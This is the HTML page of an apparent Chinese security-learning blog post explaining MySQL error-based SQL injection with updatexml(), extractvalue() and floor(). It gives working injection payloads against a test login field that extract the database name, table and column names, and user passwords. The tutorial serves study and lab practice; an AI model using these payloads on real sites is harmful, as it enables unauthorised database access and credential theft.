@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>妆薄铅华浅</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="报错注入攻击​        在MYSQL中使用一些指定的函数来制造报错，如果后台没有屏蔽数据库报错信息，发生语法错误时会输出在前端，从而可以在报错信息中获取设定的信息。 特点：​              1、 select/insert/update/delete都可以使用报错来获取信息。 ​              2、 基于函数报错的信息获取(可利用的语句包括select/insert/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="妆薄铅华浅">
+<meta property="og:url" content="http://yoursite.com/2019/08/31/SQL之报错注入攻击/index.html">
+<meta property="og:site_name" content="妆薄铅华浅">
+<meta property="og:description" content="报错注入攻击​        在MYSQL中使用一些指定的函数来制造报错，如果后台没有屏蔽数据库报错信息，发生语法错误时会输出在前端，从而可以在报错信息中获取设定的信息。 特点：​              1、 select/insert/update/delete都可以使用报错来获取信息。 ​              2、 基于函数报错的信息获取(可利用的语句包括select/insert/">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/1.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/2.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/3.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/4.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/5.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/6.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/7.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/8.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/9.png">
+<meta property="og:image" content="https://s3.ax2x.com/2019/08/31/10.png">
+<meta property="og:updated_time" content="2019-08-31T07:12:39.813Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="妆薄铅华浅">
+<meta name="twitter:description" content="报错注入攻击​        在MYSQL中使用一些指定的函数来制造报错，如果后台没有屏蔽数据库报错信息，发生语法错误时会输出在前端，从而可以在报错信息中获取设定的信息。 特点：​              1、 select/insert/update/delete都可以使用报错来获取信息。 ​              2、 基于函数报错的信息获取(可利用的语句包括select/insert/">
+<meta name="twitter:image" content="https://s3.ax2x.com/2019/08/31/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="妆薄铅华浅" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.webp">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/highlight.css">
+  <script>
+  let antiquityStorage = window.sessionStorage.getItem('antiquitySessionStorage');
+  if (antiquityStorage == '' || antiquityStorage == null) {
+    var antiquityLoader = '<div id="loaderbox"><div class="loader"><div class="load-roll"><div class="load-top"></div><div class="load-right"></div><div class="load-bottom"></div></div></div></div>';
+    document.write(antiquityLoader);
+    document.body.style.overflow = 'hidden'
+  }
+  </script>
+</head>
+</html>
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-SQL之报错注入攻击" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+  <div class="article-meta">
+    <a href="/2019/08/31/SQL之报错注入攻击/" class="article-date">
+  <time datetime="2019-08-31T03:18:31.135Z" itemprop="datePublished">2019-08-31</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <h3 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h3><p>​        在MYSQL中使用一些指定的函数来制造报错，如果后台没有屏蔽数据库报错信息，发生语法错误时会输出在前端，从而可以在报错信息中获取设定的信息。</p>
+<h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><p>​              1、 select/insert/update/delete都可以使用报错来获取信息。</p>
+<p>​              2、 基于函数报错的信息获取(可利用的语句包括select/insert/update/delete)。</p>
+<a id="more"></a>
+
+<h4 id="常用的爆错函数："><a href="#常用的爆错函数：" class="headerlink" title="常用的爆错函数："></a>常用的爆错函数：</h4><p>​               updatexml()：MYSQL对XML文档数据进行查询和修改的XPATH函数；</p>
+<p>​               extractvalue()：MYSQL对XML文档数据进行查询的XPATH函数；</p>
+<p>​                floor()  ：MYSQL中用来取整的函数。</p>
+<h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><h5 id="1、利用函数updatexml-获取数据库"><a href="#1、利用函数updatexml-获取数据库" class="headerlink" title="1、利用函数updatexml()获取数据库"></a>1、利用函数updatexml()获取数据库</h5><h5 id="2、利用函数updatexml-获取表名"><a href="#2、利用函数updatexml-获取表名" class="headerlink" title="2、利用函数updatexml()获取表名"></a>2、利用函数updatexml()获取表名</h5><h5 id="3、利用函数updatexml-获取字段名"><a href="#3、利用函数updatexml-获取字段名" class="headerlink" title="3、利用函数updatexml()获取字段名"></a>3、利用函数updatexml()获取字段名</h5><h5 id="4、利用函数updatexml-获取值"><a href="#4、利用函数updatexml-获取值" class="headerlink" title="4、利用函数updatexml()获取值"></a>4、利用函数updatexml()获取值</h5><h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><h5 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h5><p>​                       键入（1）username=a        （2）username=a‘        （3）username=a‘ ’</p>
+<p>​              <img src="https://s3.ax2x.com/2019/08/31/1.png" alt="img"></p>
+<p>​            <img src="https://s3.ax2x.com/2019/08/31/2.png" alt="img"></p>
+<p>​            <img src="https://s3.ax2x.com/2019/08/31/3.png" alt="img"></p>
+<h5 id="2、利用函数updatexml-获取数据库名"><a href="#2、利用函数updatexml-获取数据库名" class="headerlink" title="2、利用函数updatexml()获取数据库名"></a>2、利用函数updatexml()获取数据库名</h5><p>​                       键入username=a’andupdatexml(1,concat(0x7e,(database()),0x7e),1)–+</p>
+<p>​            <img src="https://s3.ax2x.com/2019/08/31/4.png" alt="img"></p>
+<h5 id="3、利用函数updatexml-获取表名"><a href="#3、利用函数updatexml-获取表名" class="headerlink" title="3、利用函数updatexml()获取表名"></a>3、利用函数updatexml()获取表名</h5><p>​                      键入username=a’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’test’limit 0,1),0x7e),1)–+</p>
+<p>​           <img src="https://s3.ax2x.com/2019/08/31/5.png" alt="img"></p>
+<p>​           <img src="https://s3.ax2x.com/2019/08/31/6.png" alt="img"></p>
+<p>​           <img src="https://s3.ax2x.com/2019/08/31/7.png" alt="img"></p>
+<h5 id="4、利用函数updatexml-获取字段名"><a href="#4、利用函数updatexml-获取字段名" class="headerlink" title="4、利用函数updatexml()获取字段名"></a>4、利用函数updatexml()获取字段名</h5><p>​                     键入username = a’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=’test’ and table_name = ‘xss’ limit 0,1),0x7e),1)–+</p>
+<p>​            <img src="https://s3.ax2x.com/2019/08/31/8.png" alt="img"></p>
+<p>​                     键入 username=a’and updatexml(1,concat(0x7e,(select         group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name = ‘xss’),0x7e),1)–+</p>
+<p>​            <img src="https://s3.ax2x.com/2019/08/31/9.png" alt="img"></p>
+<h5 id="5、利用函数updatexml-获取值"><a href="#5、利用函数updatexml-获取值" class="headerlink" title="5、利用函数updatexml()获取值"></a>5、利用函数updatexml()获取值</h5><p>​                       键入username=a’ and updatexml(1,concat(0x7e,(select    </p>
+<p>​                group_concat(username,password) from test.users),0x7e),1)–+            </p>
+<p>​            <img src="https://s3.ax2x.com/2019/08/31/10.png" alt="img"></p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+      <a href="/2019/08/31/SQL注入之堆叠查询注入攻击/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption"></strong>
+        <div class="article-nav-title">
+          
+            <div>没有了</div>
+          
+        </div>
+      </a>
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2019/08/30/SQL注入之Boolean/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title"></div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    
+<div id="gitmentContainer"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/default-avatar.webp" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        妆薄铅华浅
+      
+    </h3>
+    <p class="avatar-slogan">
+      风华是一指流沙，苍老是一段年华。
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/08/31/SQL注入之堆叠查询注入攻击/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/08/31/SQL之报错注入攻击/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/08/30/SQL注入之Boolean/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/08/20/SQL注入基础/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/08/19/ms-010漏洞利用/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2019 baby-bong &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
